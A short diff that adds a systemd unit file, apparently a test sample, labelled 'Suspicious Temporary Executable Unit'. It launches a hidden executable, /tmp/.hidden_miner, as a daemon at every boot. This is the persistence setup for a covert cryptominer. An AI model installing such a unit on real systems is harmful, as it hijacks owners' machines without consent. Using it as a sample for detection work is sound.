@@ -1,0 +1,7 @@
+[Unit]
+Description=Suspicious Temporary Executable Unit
+[Service]
+Type=simple
+ExecStart=/tmp/.hidden_miner --daemon
+[Install]
+WantedBy=multi-user.target
